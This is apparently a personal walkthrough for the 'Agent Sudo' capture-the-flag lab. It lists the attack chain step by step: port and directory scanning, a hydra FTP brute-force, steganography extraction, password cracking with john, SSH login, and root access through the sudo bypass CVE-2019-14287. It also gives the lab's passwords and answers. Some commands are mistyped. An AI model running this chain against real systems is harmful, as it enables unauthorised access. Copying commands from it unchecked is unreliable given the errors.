@@ -1,0 +1,106 @@
+#########To Solve Agent Sudo
+
+
+1) nmap scaning 
+        [nmap -sC -sV IP]
+
+    ===> then look at the reslt of search find some information
+
+
+2) go for gobuster 
+
+        [gobuster dir -u http://IP/ -w /usr/share/wordlists/dirb/common.txt]
+
+
+========(2nd CMD) ON new Tab===============================
+
+  [hydra -l chris -p /usr/share/wordlists/rockyou.txt IP ftp]
+then password will be cracked for chris : cystal
+
+     [ftp IP]
+
+name-->chris
+password:crystal        <<---ftp pass: Answer
+
+      [ls]
+
+      [lcd pictures]  <<--- my own folder
+      
+      [get cute-alien.jpg]
+
+      [get To_agentJ.txt]
+
+      [get cutie.png]
+
+      [cd pictures]
+      [ls]
+      [exiftool cute-alien.jpg]
+      [ls]
+      [binwalk cutie.png]
+      [steighide cute-alien.jpg]
+      [binwalk -e cutie.png]
+      [cd _cutie.png.extracted/]
+      [ls]
+      [zip2john 8702.zip > hash]
+      [ls]
+      [cat hash]
+      [sudo john hash --wordlists=/usr/share/wordlists/rockyou.txt]
+      [sudo john hash --show]
+
+===> password:alien  for the zip file
+now from zip file we will get 'QXJlYTUx' then now let's decode it.
+ by using cybershef
+                   QXJlYTUx = Area51 after conveterd by base 64
+
+       [cd]
+       [ls]
+       [steghide extract -sf cute-alien.jpg]  <<---pass:'Area51'
+       [ls]
+       [cat message.txt]
+
+WoW! we found username: 'james' and password:'hackerrules'
+
+      
+       [ssh james@IP]
+          yes
+          password:'hackerrules'
+
+       [id]
+       [ls]
+       [cat userflag.txt]
+       [pwd]
+
+       go to (3rdCMD)
+ -----------------------------after below (3rd CMD) command complted and about phot known
+       continus here.
+        [sudo -l]   (CVE number for the selection:'CVE-2019-14287' <<---Answer ***
+**For james , Password:'hackerrules' 
+        [sudo -u# -l bash]
+        [whoami]
+        [cd /root]
+        [ls]
+        [cat root.txt]
+
+Woow! we found the last Falg!
+
+
+       
+
+after this ==ON new Tab (3rd CMD)
+       [cd Pictures/]
+       [ls]
+       [scp james@IP:/home/james/Alien_autospy.jpg /home/aaa/pictures/oppen]
+--->> pass:hackerrules!
+  Then now we need to i dentify the picture on 'ynadex' by uploading it 
+   And modify image name * 'oppenn.jpg ' in folder you kept
+  
+  **** name of acient was:  'Roswell alien autopsy'<<----Asnswer
+
+
+
+3) ========ON NEW  Tab next to step 2 and 1
+   [curl http://IP/ -A C -L]
+ ***  here we will find user Agent name 'chris'
+
+
+DONE!
